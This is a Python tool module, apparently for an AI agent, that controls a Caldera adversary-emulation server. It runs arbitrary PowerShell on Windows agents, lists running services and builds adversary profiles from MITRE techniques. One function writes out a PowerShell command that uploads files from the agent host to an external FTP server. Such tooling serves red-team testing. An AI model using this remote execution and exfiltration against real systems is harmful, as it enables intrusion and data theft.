import os
from typing_extensions import Annotated
import json
import utils.constants
from time import sleep
import base64
from autogen.agentchat.contrib.capabilities.context_handling import (
    truncate_str_to_tokens,
)
import requests


def _caldera_headers() -> dict:
    """Return standard headers for Caldera API requests."""
    return {"KEY": utils.constants.CALDERA_API_KEY, "accept": "application/json"}


def caldera_api_method_details(
    api_method: Annotated[
        str,
        "The Caldera API for which you want the full details, ALWAYS starting with /api/v2/",
    ]
) -> Annotated[str, "The details of the API method"]:

    response = requests.get(
        f"{utils.constants.CALDERA_SERVER}/api/docs/swagger.json",
        headers=_caldera_headers(),
        timeout=30,
    )
    response.raise_for_status()
    paths = response.json().get("paths", {})
    return json.dumps(paths.get(api_method, {}), indent=2)


def caldera_api_get_operation_info() -> (
    Annotated[str, "The ID of the active Caldera Operation"]
):
    response = requests.get(
        f"{utils.constants.CALDERA_SERVER}/api/operations",
        headers=_caldera_headers(),
        timeout=30,
    )
    response.raise_for_status()
    operations = response.json()
    if not operations:
        return ""
    return operations[0].get("id", "")


def caldera_api_request(
    api_method: Annotated[
        str,
        "The Caldera API path to request, ALWAYS starting with /api/v2/",
    ]
) -> Annotated[
    str, "The output of the API request to the Caldera server for the given API method"
]:
    try:
        response = requests.get(
            f"{utils.constants.CALDERA_SERVER}{api_method}",
            headers=_caldera_headers(),
            timeout=30,
        )
        response.raise_for_status()
        return_info = "The command was successful with the following output:" + response.text
    except requests.RequestException as e:
        return_info = f"The API request to '{api_method}' failed: {e}"

    return truncate_str_to_tokens(return_info, 4000)


def caldera_swagger_info() -> Annotated[
    str,
    "The list of all available Caldera API methods along with a description of their functionality",
]:
    response = requests.get(
        f"{utils.constants.CALDERA_SERVER}/api/docs/swagger.json",
        headers=_caldera_headers(),
        timeout=30,
    )
    response.raise_for_status()
    paths = response.json().get("paths", {})
    result = []
    for path, methods in paths.items():
        for _method, details in methods.items():
            result.append({
                "path": path,
                "description": details.get("description", ""),
            })
    return json.dumps(result, indent=2)


def caldera_service_list(
    agent_paw: Annotated[
        str,
        "The Caldera agent paw from which the file should be uploaded",
    ],
    operation_id: Annotated[str, "The ID of the Caldera operation"],
) -> Annotated[
    str,
    "The list of all running services on the Caldera agent",
]:
    return caldera_execute_command_on_agent(
        agent_paw,
        operation_id,
        "Get-WmiObject Win32_Service | Where-Object { ($_.State -eq 'Running') -and ($_.PathName -like '*Program Files*') } | Select-Object Name, PathName",
    )


def caldera_upload_file_from_agent(
    agent_paw: Annotated[
        str,
        "The Caldera agent paw from which the file should be uploaded",
    ],
    operation_id: Annotated[str, "The ID of the Caldera operation"],
    file_path: Annotated[str, "The full path of the file to upload"],
) -> Annotated[
    str,
    "The result of the upload operation",
]:
    basename = os.path.basename(file_path.replace("\\", "/"))

    command = f"""$ftp = 'ftp://{utils.constants.FTP_SERVER_ADDRESS}/{basename}';
    $user = '{utils.constants.FTP_SERVER_USER}'; $pass = '{utils.constants.FTP_SERVER_PASS}'; $webclient = New-Object System.Net.WebClient;
    $webclient.Credentials = New-Object System.Net.NetworkCredential($user, $pass);
    $webclient.UploadFile($ftp, '{file_path}')
    """

    print(command)
    return caldera_execute_command_on_agent(agent_paw, operation_id, command, name="psh")


def caldera_execute_command_on_agent(
    agent_paw: Annotated[
        str,
        "The Caldera agent paw on which the command should be executed",
    ],
    operation_id: Annotated[str, "The ID of the Caldera operation"],
    command: Annotated[str, "The command to execute"],
    name: Annotated[str, "Can be psh (PowerShell) or cmd (command prompt)"] = "psh",
) -> Annotated[
    str,
    "The output of the command executed on the Caldera agent",
]:
    command_arguments = {
        "paw": agent_paw,
        "executor": {
            "name": name,
            "platform": "windows",
            "command": command,
            "timeout": "120",
        },
    }

    try:
        response = requests.post(
            f"{utils.constants.CALDERA_SERVER}/api/v2/operations/{operation_id}/potential-links",
            headers={**_caldera_headers(), "Content-Type": "application/json"},
            json=command_arguments,
            timeout=30,
        )
        response.raise_for_status()
        parsed_json = response.json()
    except requests.RequestException as e:
        return f"Failed to submit command to CALDERA: {e}"
    except ValueError:
        return "Failed to parse CALDERA response as JSON."

    if "id" not in parsed_json:
        return "Command did not execute successfully — no link ID returned: " + str(parsed_json)

    link_id = parsed_json["id"]
    status = -3  # CALDERA default "not started" status
    result_json = {}

    # Poll for result with a 120-second timeout (1 poll per second)
    max_polls = 120
    for _ in range(max_polls):
        try:
            result_response = requests.get(
                f"{utils.constants.CALDERA_SERVER}/api/v2/operations/{operation_id}/links/{link_id}/result",
                headers=_caldera_headers(),
                timeout=30,
            )
            result_response.raise_for_status()
            result_json = result_response.json()
        except requests.RequestException as e:
            return f"Failed to poll CALDERA result: {e}"

        link_status = result_json.get("link", {}).get("status")
        if link_status is not None and link_status != status:
            break
        sleep(1)
    else:
        return "Command timed out: CALDERA agent did not respond within 120 seconds."

    try:
        raw_result = result_json.get("result", "")
        decoded = base64.b64decode(raw_result).decode("utf-8")
        return "Command output: " + decoded
    except Exception:
        return "Command output: " + str(result_json)


def caldera_create_adversary_profile(
    name: Annotated[
        str,
        "The name of the Adversary profile in Caldera",
    ],
    description: Annotated[str, "The description of the Adversary profile in Caldera"],
) -> Annotated[
    str,
    "The output of the Caldera API",
]:
    try:
        response = requests.post(
            f"{utils.constants.CALDERA_SERVER}/api/v2/adversaries",
            headers={**_caldera_headers(), "Content-Type": "application/json"},
            json={"name": name, "description": description},
            timeout=30,
        )
        response.raise_for_status()
        return_info = "The command was successful with the following output:" + response.text
    except requests.RequestException as e:
        return_info = f"Failed to create adversary profile: {e}"

    return truncate_str_to_tokens(return_info, 4000)


def caldera_add_abilities_to_adversary_profile(
    adversary_id: Annotated[
        str,
        "The ID of the Adversary profile in Caldera",
    ],
    atomic_ordering: Annotated[
        list, "The list of ability IDs for the Adversary profile in Caldera"
    ],
) -> Annotated[
    str,
    "The output of the Caldera API",
]:
    try:
        response = requests.patch(
            f"{utils.constants.CALDERA_SERVER}/api/v2/adversaries/{adversary_id}",
            headers={**_caldera_headers(), "Content-Type": "application/json"},
            json={"atomic_ordering": atomic_ordering},
            timeout=30,
        )
        response.raise_for_status()
        return_info = "The command was successful with the following output:" + response.text
    except requests.RequestException as e:
        return_info = f"Failed to update adversary profile '{adversary_id}': {e}"

    return truncate_str_to_tokens(return_info, 4000)


def match_techniques_to_caldera_abilities(
    report_techniques: Annotated[
        list,
        "The mitre technique ids extracted from a report",
    ]
) -> Annotated[str, "The matched techniques"]:

    caldera_abilities = []
    try:
        res = requests.get(
            f"{utils.constants.CALDERA_SERVER}/api/v2/abilities",
            params={"include": ["ability_id", "technique_name", "technique_id"]},
            headers=_caldera_headers(),
            timeout=30,
        )
        if res.status_code == 200:
            caldera_abilities = res.json()
    except requests.RequestException as e:
        return f"Failed to fetch CALDERA abilities: {e}"

    matched_abilities = []

    for caldera_ability in caldera_abilities:
        ability_technique_id = caldera_ability.get("technique_id")
        for report_technique in report_techniques:
            matched = False
            if isinstance(report_technique, str):
                matched = report_technique == ability_technique_id
            elif isinstance(report_technique, dict):
                matched = (
                    report_technique.get("technique_id") == ability_technique_id
                    or report_technique.get("id") == ability_technique_id
                )
            if matched and caldera_ability not in matched_abilities:
                matched_abilities.append(caldera_ability)

    return str(matched_abilities)
